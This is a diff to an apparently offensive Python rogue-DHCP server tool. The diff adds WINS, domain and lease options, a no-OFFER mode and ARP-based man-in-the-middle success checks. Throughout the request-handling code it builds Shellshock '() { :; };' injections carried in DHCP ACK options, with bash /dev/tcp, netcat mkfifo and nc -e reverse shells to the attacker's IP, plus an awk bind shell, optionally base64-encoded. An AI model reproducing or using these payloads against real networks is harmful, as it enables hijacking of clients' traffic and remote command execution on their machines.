@@ -40,7 +40,7 @@ parser.add_argument('-i', '--interface', help='Set interface name for send reply
 parser.add_argument('-f', '--first_offer_ip', type=str, help='Set first client ip for offering', default=None)
 parser.add_argument('-l', '--last_offer_ip', type=str, help='Set last client ip for offering', default=None)
 parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
-parser.add_argument('-I', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac', default=None)
+parser.add_argument('-T', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac', default=None)
 parser.add_argument('-m', '--netmask', type=str, help='Set network mask', default=None)
 
 parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server MAC address, if not set use your MAC address', default=None)
@@ -49,7 +49,10 @@ parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if 
 parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address', default=None)
 parser.add_argument('--dns', type=str, help='Set DNS server IP address, if not set use your ip address', default=None)
 parser.add_argument('--tftp', type=str, help='Set TFTP server IP address', default=None)
+parser.add_argument('--wins', type=str, help='Set WINS server IP address', default=None)
 parser.add_argument('--proxy', type=str, help='Set Proxy URL', default=None)
+parser.add_argument('--domain', type=str, help='Set domain name for search, default=local', default="local")
+parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)
 
 parser.add_argument('-s', '--send_discover', action='store_true',
                     help='Send DHCP discover packets in the background thread')
@@ -75,10 +78,8 @@ parser.add_argument('--iface_name', type=str,
                     help='Set iface name in shellshock payload, default = eth0', default="eth0")
 
 parser.add_argument('--broadcast_response', action='store_true', help='Send broadcast response')
+parser.add_argument('--dnsop', action='store_true', help='Do not send DHCP OFFER packets')
 parser.add_argument('--exit', action='store_true', help='Exit on success MiTM attack')
-parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)
-parser.add_argument('--domain', type=str, help='Set domain name for search, default=local', default="local")
-
 parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
 
 args = parser.parse_args()
@@ -109,6 +110,7 @@ dhcp_server_ip_address = None
 router_ip_address = None
 dns_server_ip_address = None
 tftp_server_ip_address = None
+wins_server_ip_address = None
 proxy_url = None
 
 dhcp_discover_packets_source_mac = None
@@ -226,7 +228,7 @@ else:
         dhcp_server_ip_address = args.dhcp_ip
 # endregion
 
-# region Set router, dns, tftp IP address and proxy url
+# region Set router, dns, tftp, wins IP address and proxy url
 
 # Set router IP address
 if args.router is None:
@@ -260,6 +262,17 @@ else:
         exit(1)
     else:
         tftp_server_ip_address = args.tftp
+
+# Set WINS server IP address
+if args.wins is None:
+    wins_server_ip_address = your_ip_address
+else:
+    if not Base.ip_address_in_range(args.wins, first_ip_address, last_ip_address):
+        Base.print_error("Bad value `--wins`: ", args.tftp,
+                         "; WINS server IP address must be in range: ", first_ip_address + " - " + last_ip_address)
+        exit(1)
+    else:
+        wins_server_ip_address = args.wins
 
 # Set proxy url
 if args.proxy is None:
@@ -381,20 +394,20 @@ def make_dhcp_ack_packet(transaction_id, target_mac, target_ip, destination_mac=
                                      proxy=bytes(proxy_url),
                                      domain=domain,
                                      tftp=tftp_server_ip_address,
-                                     payload_option_code=args.shellshock_option_code,
-                                     enable_netbios=True)
+                                     wins=wins_server_ip_address,
+                                     payload_option_code=args.shellshock_option_code)
 # endregion
 
 
 # region Make DHCP nak packet
-def make_dhcp_nak_packet(transaction_id, requested_ip, target_ip):
+def make_dhcp_nak_packet(transaction_id,  target_mac, target_ip, requested_ip):
     return dhcp.make_nak_packet(source_mac=dhcp_server_mac_address,
-                                destination_mac=target_mac_address,
+                                destination_mac=target_mac,
                                 source_ip=dhcp_server_ip_address,
                                 destination_ip=requested_ip,
                                 transaction_id=transaction_id,
                                 your_ip=target_ip,
-                                client_mac=target_mac_address,
+                                client_mac=target_mac,
                                 dhcp_server_id=dhcp_server_ip_address)
 # endregion
 
@@ -477,44 +490,48 @@ def reply(request):
 
         # region DHCP DISCOVER
         if request[DHCP].options[0][1] == 1:
-            # region Start DHCP discover sender
-            if args.send_discover:
-                if not discover_sender_is_work:
-                    discover_sender(100)
-            # endregion
 
             # region Print INFO message
             Base.print_info("DHCP DISCOVER from: ", client_mac_address, " transaction id: ", hex(transaction_id))
             # endregion
 
-            # If target IP address is set - offer IP = target IP
-            if target_ip_address is not None:
-                offer_ip_address = target_ip_address
+            # If parameter "Do not send DHCP OFFER packets" is not set
+            if not args.dnsop:
 
-            # If target IP address is not set - offer IP = random IP from free IP addresses list
-            else:
-                random_index = randint(0, len(free_ip_addresses))
-                offer_ip_address = free_ip_addresses[random_index]
+                # region Start DHCP discover sender
+                if args.send_discover:
+                    if not discover_sender_is_work:
+                        discover_sender(100)
+                # endregion
 
-                # Delete offer IP from free IP addresses list
-                del free_ip_addresses[random_index]
+                # If target IP address is set - offer IP = target IP
+                if target_ip_address is not None:
+                    offer_ip_address = target_ip_address
 
-            if args.broadcast_response:
-                offer_packet = make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address)
-            else:
-                offer_packet = make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address,
-                                                      client_mac_address, offer_ip_address)
+                # If target IP address is not set - offer IP = random IP from free IP addresses list
+                else:
+                    random_index = randint(0, len(free_ip_addresses))
+                    offer_ip_address = free_ip_addresses[random_index]
 
-            SOCK.send(offer_packet)
+                    # Delete offer IP from free IP addresses list
+                    del free_ip_addresses[random_index]
 
-            # Add client info in global clients dictionary
-            add_client_info_in_dictionary(client_mac_address,
-                                          {"transaction": transaction_id, "discover": True,
-                                           "offer_ip": offer_ip_address},
-                                          client_already_in_dictionary)
-            # print clients
+                if args.broadcast_response:
+                    offer_packet = make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address)
+                else:
+                    offer_packet = make_dhcp_offer_packet(transaction_id, offer_ip_address, client_mac_address,
+                                                          client_mac_address, offer_ip_address)
 
-            Base.print_info("DHCP OFFER to: ", client_mac_address, " offer IP: ", offer_ip_address)
+                SOCK.send(offer_packet)
+
+                # Add client info in global clients dictionary
+                add_client_info_in_dictionary(client_mac_address,
+                                              {"transaction": transaction_id, "discover": True,
+                                               "offer_ip": offer_ip_address},
+                                              client_already_in_dictionary)
+
+                # Print INFO message
+                Base.print_info("DHCP OFFER to: ", client_mac_address, " offer IP: ", offer_ip_address)
         # endregion
 
         # region DHCP RELEASE
@@ -572,12 +589,6 @@ def reply(request):
 
         # region DHCP REQUEST
         if request[DHCP].options[0][1] == 3:
-            # region Start DHCP discover sender
-            if args.send_discover:
-                if not discover_sender_is_work:
-                    discover_sender(100)
-            # endregion
-
             # region Set local variables
             requested_ip = "0.0.0.0"
             offer_ip = None
@@ -594,147 +605,170 @@ def reply(request):
                             " requested ip: ", requested_ip)
             # endregion
 
-            # region Change client info in global clients dictionary
-
-            # Add client info in global clients dictionary
-            add_client_info_in_dictionary(client_mac_address,
-                                          {"request": True, "requested_ip": requested_ip,
-                                           "transaction": transaction_id},
-                                          client_already_in_dictionary)
-
-            # Delete ARP mitm success keys in dictionary for this client
-            clients[client_mac_address].pop('client request his ip', None)
-            clients[client_mac_address].pop('client request router ip', None)
-
+            # region Requested IP not in range from first offer IP to last offer IP
+            if not Base.ip_address_in_range(requested_ip, first_offer_ip_address, last_offer_ip_address):
+                Base.print_warning("Client: ", client_mac_address, " requested IP: ", requested_ip,
+                                   " not in range: ", first_offer_ip_address + " - " + last_offer_ip_address)
             # endregion
 
-            # region Get offer IP address
-            try:
-                offer_ip = clients[client_mac_address]["offer_ip"]
-            except KeyError:
-                pass
-            # endregion
+            # region Requested IP in range from first offer IP to last offer IP
+            else:
+                # region Start DHCP discover sender
+                if args.send_discover:
+                    if not discover_sender_is_work:
+                        discover_sender(100)
+                # endregion
 
-            # region This client already send DHCP DISCOVER and offer IP != requested IP
-            if offer_ip is not None and offer_ip != requested_ip:
-                # Print error message
-                Base.print_error("Client: ", client_mac_address, " requested IP: ", requested_ip,
-                                 " not like offer IP: ", offer_ip)
-
-                # Create and send DHCP nak packet
-                nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip, offer_ip)
-                SOCK.send(nak_packet)
-                Base.print_info("DHCP NAK to: ", client_mac_address, " requested ip: ", requested_ip)
+                # region Change client info in global clients dictionary
 
                 # Add client info in global clients dictionary
                 add_client_info_in_dictionary(client_mac_address,
-                                              {"mitm": "error: offer ip not like requested ip", "offer_ip": None},
+                                              {"request": True, "requested_ip": requested_ip,
+                                               "transaction": transaction_id},
                                               client_already_in_dictionary)
-                # print clients
-            # endregion
 
-            # region Offer IP == requested IP or this is a first request from this client
-            else:
+                # Delete ARP mitm success keys in dictionary for this client
+                clients[client_mac_address].pop('client request his ip', None)
+                clients[client_mac_address].pop('client request router ip', None)
+                clients[client_mac_address].pop('client request dns ip', None)
 
-                # region Target IP address is set and requested IP != target IP
-                if target_ip_address is not None and requested_ip != target_ip_address:
+                # endregion
 
+                # region Get offer IP address
+                try:
+                    offer_ip = clients[client_mac_address]["offer_ip"]
+                except KeyError:
+                    pass
+                # endregion
+
+                # region This client already send DHCP DISCOVER and offer IP != requested IP
+                if offer_ip is not None and offer_ip != requested_ip:
                     # Print error message
                     Base.print_error("Client: ", client_mac_address, " requested IP: ", requested_ip,
-                                     " not like target IP: ", target_ip_address)
+                                     " not like offer IP: ", offer_ip)
 
                     # Create and send DHCP nak packet
-                    nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip, target_ip_address)
+                    nak_packet = make_dhcp_nak_packet(transaction_id, client_mac_address, offer_ip, requested_ip)
                     SOCK.send(nak_packet)
                     Base.print_info("DHCP NAK to: ", client_mac_address, " requested ip: ", requested_ip)
 
                     # Add client info in global clients dictionary
                     add_client_info_in_dictionary(client_mac_address,
-                                                  {"mitm": "error: target ip not like requested ip", "offer_ip": None,
-                                                   "nak": True},
+                                                  {"mitm": "error: offer ip not like requested ip", "offer_ip": None},
                                                   client_already_in_dictionary)
-
+                    # print clients
                 # endregion
 
-                # region Settings shellshock payload
-
-                # region Create payload
-
-                # Network settings command in target machine
-                net_settings = args.ip_path + "ip addr add " + requested_ip + "/" + \
-                               str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"
-
-                # Shellshock payload: <user bash command>
-                if args.shellshock_command is not None:
-                    payload = args.shellshock_command
-
-                # Shellshock payload:
-                # awk 'BEGIN{s="/inet/tcp/<bind_port>/0/0";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &
-                if args.bind_shell:
-                    payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
-                              "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
-
-                # Shellshock payload:
-                # rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <your_port> >/tmp/f &
-                if args.nc_reverse_shell:
-                    payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
-                              your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
-
-                # Shellshock payload:
-                # /bin/nc -e /bin/sh <your_ip> <your_port> 2>&1 &
-                if args.nce_reverse_shell:
-                    payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"
-
-                # Shellshock payload:
-                # /bin/bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1 &
-                if args.bash_reverse_shell:
-                    payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
-                              "/" + str(args.reverse_port) + " 0>&1 &"
-
-                if payload is not None:
-
-                    # Do not add network settings command in payload
-                    if not args.without_network:
-                        payload = net_settings + payload
-
-                    # Send payload to target in clear text
-                    if args.without_base64:
-                        shellshock_url = "() { :; }; " + payload
-
-                    # Send base64 encoded payload to target in clear text
-                    else:
-                        payload = b64encode(payload)
-                        shellshock_url = "() { :; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
-                # endregion
-
-                # region Check Shellshock payload length
-                if shellshock_url is not None:
-                    if len(shellshock_url) > 255:
-                        Base.print_error("Length of shellshock payload is very big! Current length: ",
-                                         str(len(shellshock_url)), " Maximum length: ", "254")
-                        shellshock_url = "A"
-                # endregion
-
-                # endregion
-
-                # region Send DHCP ack and print info message
-                if args.broadcast_response:
-                    ack_packet = make_dhcp_ack_packet(transaction_id, client_mac_address, requested_ip)
+                # region Offer IP == requested IP or this is a first request from this client
                 else:
-                    ack_packet = make_dhcp_ack_packet(transaction_id, client_mac_address, requested_ip,
-                                                      client_mac_address, requested_ip)
 
-                SOCK.send(ack_packet)
+                    # region Target IP address is set and requested IP != target IP
+                    if target_ip_address is not None and requested_ip != target_ip_address:
 
-                Base.print_info("DHCP ACK to: ", client_mac_address, " requested ip: ", requested_ip)
+                        # Print error message
+                        Base.print_error("Client: ", client_mac_address, " requested IP: ", requested_ip,
+                                         " not like target IP: ", target_ip_address)
+
+                        # Create and send DHCP nak packet
+                        nak_packet = make_dhcp_nak_packet(transaction_id, client_mac_address,
+                                                          target_ip_address, requested_ip)
+                        SOCK.send(nak_packet)
+                        Base.print_info("DHCP NAK to: ", client_mac_address, " requested ip: ", requested_ip)
+
+                        # Add client info in global clients dictionary
+                        add_client_info_in_dictionary(client_mac_address,
+                                                      {"mitm": "error: target ip not like requested ip", "offer_ip": None,
+                                                       "nak": True},
+                                                      client_already_in_dictionary)
+
+                    # endregion
+
+                    # region Target IP address is set and requested IP == target IP or Target IP is not set
+                    else:
+                        # region Settings shellshock payload
+
+                        # region Create payload
+
+                        # Network settings command in target machine
+                        net_settings = args.ip_path + "ip addr add " + requested_ip + "/" + \
+                                       str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"
+
+                        # Shellshock payload: <user bash command>
+                        if args.shellshock_command is not None:
+                            payload = args.shellshock_command
+
+                        # Shellshock payload:
+                        # awk 'BEGIN{s="/inet/tcp/<bind_port>/0/0";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &
+                        if args.bind_shell:
+                            payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
+                                      "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
+
+                        # Shellshock payload:
+                        # rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <your_port> >/tmp/f &
+                        if args.nc_reverse_shell:
+                            payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
+                                      your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
+
+                        # Shellshock payload:
+                        # /bin/nc -e /bin/sh <your_ip> <your_port> 2>&1 &
+                        if args.nce_reverse_shell:
+                            payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"
+
+                        # Shellshock payload:
+                        # /bin/bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1 &
+                        if args.bash_reverse_shell:
+                            payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
+                                      "/" + str(args.reverse_port) + " 0>&1 &"
+
+                        if payload is not None:
+
+                            # Do not add network settings command in payload
+                            if not args.without_network:
+                                payload = net_settings + payload
+
+                            # Send payload to target in clear text
+                            if args.without_base64:
+                                shellshock_url = "() { :; }; " + payload
+
+                            # Send base64 encoded payload to target in clear text
+                            else:
+                                payload = b64encode(payload)
+                                shellshock_url = "() { :; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
+                        # endregion
+
+                        # region Check Shellshock payload length
+                        if shellshock_url is not None:
+                            if len(shellshock_url) > 255:
+                                Base.print_error("Length of shellshock payload is very big! Current length: ",
+                                                 str(len(shellshock_url)), " Maximum length: ", "254")
+                                shellshock_url = "A"
+                        # endregion
+
+                        # endregion
+
+                        # region Send DHCP ack and print info message
+                        if args.broadcast_response:
+                            ack_packet = make_dhcp_ack_packet(transaction_id, client_mac_address, requested_ip)
+                        else:
+                            ack_packet = make_dhcp_ack_packet(transaction_id, client_mac_address, requested_ip,
+                                                              client_mac_address, requested_ip)
+
+                        SOCK.send(ack_packet)
+
+                        Base.print_info("DHCP ACK to: ", client_mac_address, " requested ip: ", requested_ip)
+                        # endregion
+
+                        # region Add client info in global clients dictionary
+                        try:
+                            clients[client_mac_address].update({"mitm": "success"})
+                        except KeyError:
+                            clients[client_mac_address] = {"mitm": "success"}
+                        # endregion
+                    # endregion
+
                 # endregion
 
-                # region Add client info in global clients dictionary
-                try:
-                    clients[client_mac_address].update({"mitm": "success"})
-                except KeyError:
-                    clients[client_mac_address] = {"mitm": "success"}
-                # endregion
+            # endregion
 
         # endregion
 
@@ -812,17 +846,24 @@ def reply(request):
                 if arp_target_ip_address == router_ip_address:
                     clients[arp_sender_mac_address].update({"client request router ip": True})
 
+                if arp_target_ip_address == dns_server_ip_address:
+                    clients[arp_sender_mac_address].update({"client request dns ip": True})
+
                 try:
                     test = clients[arp_sender_mac_address]["client request his ip"]
                     test = clients[arp_sender_mac_address]["client request router ip"]
+                    test = clients[arp_sender_mac_address]["client request dns ip"]
 
                     try:
                         test = clients[arp_sender_mac_address]["success message"]
                     except KeyError:
-                        Base.print_success("MITM success: ", requested_ip + " (" + arp_sender_mac_address + ")")
-                        clients[arp_sender_mac_address].update({"success message": True})
                         if args.exit:
+                            sleep(3)
+                            Base.print_success("MITM success: ", requested_ip + " (" + arp_sender_mac_address + ")")
                             exit(0)
+                        else:
+                            Base.print_success("MITM success: ", requested_ip + " (" + arp_sender_mac_address + ")")
+                            clients[arp_sender_mac_address].update({"success message": True})
 
                 except KeyError:
                     pass
